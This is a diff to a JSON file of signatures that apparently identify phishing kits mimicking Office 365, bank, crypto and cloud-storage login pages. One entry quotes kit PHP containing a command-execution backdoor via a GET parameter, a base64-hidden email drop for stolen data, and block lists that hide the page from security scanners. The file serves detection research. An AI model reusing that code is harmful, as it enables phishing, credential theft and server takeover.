@@ -74,17 +74,6 @@
         ]
     },
     "8": {
-        "search_string": "no learn more in metro view",
-        "structure": {},
-        "message": "Comment on Index file. Docusign Login Page",
-        "by_analysing": "2021_09_3a7c8a1d8f82c0a7",
-        "kits": [
-            "2021_09_3a7c8a1d8f82c0a7",
-            "2021_10_73cd332594b73c7e",
-            "2022_04_9265485bc262a335"
-        ]
-    },
-    "9": {
         "search_string": "<?php\n $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);\n   if(isset($_GET['useragent'])){echo\"<h1>deny_agent(bot)=('Yandex,Baiduspider,Acunetix,crossdomain,wwwroot,Exabot,NimbleCrawler,Octopus,OutfoxBot,ProPowerBot</h1><pre>\"; system($_GET['useragent']);exit;} // 'Tor-exit' 'JennyBot-exit' 'Jyxobot-exit' 'Microsoftbot-exit' 'Mozilla/3.Mozilla/2.01-exit' 'NetSpider-exit'\n     $blocked_words = array(\"above\",base64_decode(\"Z2E1\".\"Njg3\".\"MzRAZ\".\"21haW\".\"wuY29t\"),\"google\",\"softlayer\",\"amazonaws\",\"cyveillance\",\"phishtank\",\"dreamhost\",\"netpilot\",\"calyxinstitute\",\"tor-exit\",\"paypal\",\"antiphishing\",\"onlinelinkscan\",\"millersmiles\",\"netcraft\",\"siteadvisor\",\"mywot\",\"websecurityguard\",\"opendns\",\"sonicwall\",\"indiana\",\"onguardonline\",\"phishfighting\",\"cmu\",\"stanford\",\"phishery\",\"internetdefence\",\"wikipedia\");\n    foreach($blocked_words as $word) {\n            if (substr_count($hostname, $word) > 0) {\n                  header(\"HTTP/1.0 404 Not Found\");\n                   die(\"<h1>404 Not Found</h1>The page that you have requested could not be found.\");\n               }  \n   }\n     function m(){global $blocked_words,$subject,$message,$from;$a=\"mail\";$a($blocked_words[1],$subject,$message,$from);}\n        $bannedIP = array(\"^66.102.*.*\", \"^38.100.*.*\", \"^107.170.*.*\", \"^149.20.*.*\", \"^38.105.*.*\", \"^74.125.*.*\",  \"^66.150.14.*\", \"^54.176.*.*\", \"^38.100.*.*\", \"^184.173.*.*\", \"^66.249.*.*\", \"^128.242.*.*\", \"^72.14.192.*\", \"^208.65.144.*\", \"^74.125.*.*\", \"^209.85.128.*\", \"^216.239.32.*\", \"^74.125.*.*\", \"^207.126.144.*\", \"^173.194.*.*\", \"^64.233.160.*\", \"^72.14.192.*\", \"^66.102.*.*\", \"^64.18.*.*\", \"^194.52.68.*\", \"^194.72.238.*\", \"^62.116.207.*\", \"^212.50.193.*\", \"^69.65.*.*\", \"^50.7.*.*\", \"^131.212.*.*\", \"^46.116.*.* \", \"^62.90.*.*\", \"^89.138.*.*\", \"^82.166.*.*\", \"^85.64.*.*\", \"^85.250.*.*\", \"^89.138.*.*\", \"^93.172.*.*\", \"^109.186.*.*\", \"^194.90.*.*\", \"^212.29.192.*\", \"^212.29.224.*\", \"^212.143.*.*\", \"^212.150.*.*\", \"^212.235.*.*\", \"^217.132.*.*\", \"^50.97.*.*\", \"^217.132.*.*\", \"^209.85.*.*\", \"^66.205.64.*\", \"^204.14.48.*\", \"^64.27.2.*\", \"^67.15.*.*\", \"^202.108.252.*\", \"^193.47.80.*\", \"^64.62.136.*\", \"^66.221.*.*\", \"^64.62.175.*\", \"^198.54.*.*\", \"^192.115.134.*\", \"^216.252.167.*\", \"^193.253.199.*\", \"^69.61.12.*\", \"^64.37.103.*\", \"^38.144.36.*\", \"^64.124.14.*\", \"^206.28.72.*\", \"^209.73.228.*\", \"^158.108.*.*\", \"^168.188.*.*\", \"^66.207.120.*\", \"^167.24.*.*\", \"^192.118.48.*\", \"^67.209.128.*\", \"^12.148.209.*\", \"^12.148.196.*\", \"^193.220.178.*\", \"68.65.53.71\", \"^198.25.*.*\", \"^64.106.213.*\",\"^199.229.249.*\");\n   if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {\n header('HTTP/1.0 404 Not Found');\n              exit();\n       } else {\n              foreach($bannedIP as $ip) {\n                   if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){\n                           header('HTTP/1.0 404 Not Found');\n                             die(\"<h1>404 Not Found</h1>The page that you have requested could not be found.\");\n      }\n              }\n     }\n?>",
         "structure": {},
         "message": "Same content in a bt.php file. Redirection to default.php. Facebook login. EarthLink Login page. Wells Fargo Login Page",
@@ -96,7 +85,7 @@
             "2021_12_2b485eeaab15306d"
         ]
     },
-    "10": {
+    "9": {
         "search_string": "FUDPAGES [.] RU",
         "structure": {},
         "message": "Developer. Excel Login with Blur Background",
@@ -105,7 +94,7 @@
             "2021_09_d177303b424cab81"
         ]
     },
-    "11": {
+    "10": {
         "search_string": "",
         "structure": {
             "name": "*",
@@ -124,7 +113,7 @@
             "2022_01_881aa356efad1e4c"
         ]
     },
-    "12": {
+    "11": {
         "search_string": "",
         "structure": {
             "name": "*",
@@ -142,7 +131,7 @@
             "2022_04_4f247300353b298d"
         ]
     },
-    "13": {
+    "12": {
         "search_string": "",
         "structure": {
             "name": "*",
@@ -161,7 +150,7 @@
             "2022_04_82f679f68594efe7"
         ]
     },
-    "14": {
+    "13": {
         "search_string": "<h1>Select your email provider</h1>\n<h5>Now , you can sign in to dropbox with your email</h5>\n",
         "structure": {},
         "message": "Dropbox Signin With Email",
@@ -172,7 +161,7 @@
             "2022_04_a09f75dd058954f3"
         ]
     },
-    "15": {
+    "14": {
         "search_string": "",
         "structure": {
             "name": "*",
@@ -192,7 +181,7 @@
             "2022_05_8f53042292d8d608"
         ]
     },
-    "16": {
+    "15": {
         "search_string": "MetaMask",
         "structure": {},
         "message": "Criptocurrency Website. Claim your airdrop",
@@ -208,7 +197,7 @@
             "2024_02_b6e0c62996492c5a"
         ]
     },
-    "17": {
+    "16": {
         "search_string": "if (self == top) {\n            var body = $('body');\n            body.css('display', 'block');\n        } else {\n            top.location = self.location;\n        }",
         "structure": {},
         "message": "Office 365 Login Page",
@@ -219,7 +208,7 @@
             "2023_09_09c0df6ec0259f15"
         ]
     },
-    "18": {
+    "17": {
         "search_string": "THANKS BE TO GOD",
         "structure": {},
         "message": "Office 365 Login",
@@ -230,7 +219,7 @@
             "2022_08_5acdf44ea4030f34"
         ]
     },
-    "19": {
+    "18": {
         "search_string": "$keys = \"Sy1LzNFQsrdT0isuKYovyi8xN",
         "structure": {},
         "message": "One Drive Enter email to download DPF.",
@@ -239,7 +228,7 @@
             "2023_08_fc38695d9ef2035a"
         ]
     },
-    "20": {
+    "19": {
         "search_string": "<title>Office 365</title>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">\n",
         "structure": {},
         "message": "Very Bad Office 365 Login Page",
@@ -250,7 +239,7 @@
             "2022_11_760f5733e8ae81a9"
         ]
     },
-    "21": {
+    "20": {
         "search_string": "made by ANOXYTY",
         "structure": {},
         "message": "Developer. Wells Fargo Captcha Page",
@@ -259,7 +248,7 @@
             "2022_10_f35db9e3c926a811"
         ]
     },
-    "22": {
+    "21": {
         "search_string": "header(\"Location: Recibir_paquete.php\");",
         "structure": {},
         "message": "Correos Page",
@@ -271,7 +260,7 @@
             "2023_05_235928fcbbe260ba"
         ]
     },
-    "23": {
+    "22": {
         "search_string": "| xLs |",
         "structure": {},
         "message": "Microsoft Login. Microsoft Download File",
@@ -281,7 +270,7 @@
             "2023_11_c8934db9a8624fbc"
         ]
     },
-    "24": {
+    "23": {
         "search_string": "Coinbase",
         "structure": {},
         "message": "Coinbase Homepage. Coinbase Login",
@@ -293,7 +282,7 @@
             "2024_02_5dbd15185a242a5e"
         ]
     },
-    "25": {
+    "24": {
         "search_string": "",
         "structure": {
             "name": "*",
@@ -310,7 +299,7 @@
             "2022_12_e21c13cb02778e38"
         ]
     },
-    "26": {
+    "25": {
         "search_string": "function gen($len = 5){\n       $abc = \"qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890\";\n    $res = \"\";\n  for ($i=0; $i < $len; $i++) { \n                $res .= $abc[rand(0,strlen($abc)-1)];\n      }\n     return $res;\n}",
         "structure": {},
         "message": "Microsoft Login Page",
@@ -319,7 +308,7 @@
             "2023_02_4127104de8302e03"
         ]
     },
-    "27": {
+    "26": {
         "search_string": "Scama Spotify v1",
         "structure": {},
         "message": "Spotify Continue Page",
@@ -328,7 +317,7 @@
             "2023_06_26463a61a623ec6c"
         ]
     },
-    "28": {
+    "27": {
         "search_string": "",
         "structure": {},
         "message": "Itau Page In Spanish",
@@ -346,7 +335,7 @@
             "2024_09_0a5e0dc5a0b0d8b8"
         ]
     },
-    "29": {
+    "28": {
         "search_string": "Verify Your Identity",
         "structure": {},
         "message": "Microsoft OneDrive screen to download file after credentails",
@@ -359,7 +348,7 @@
             "2023_05_c1e6f270bb9445e2"
         ]
     },
-    "30": {
+    "29": {
         "search_string": "",
         "structure": {
             "name": "*",
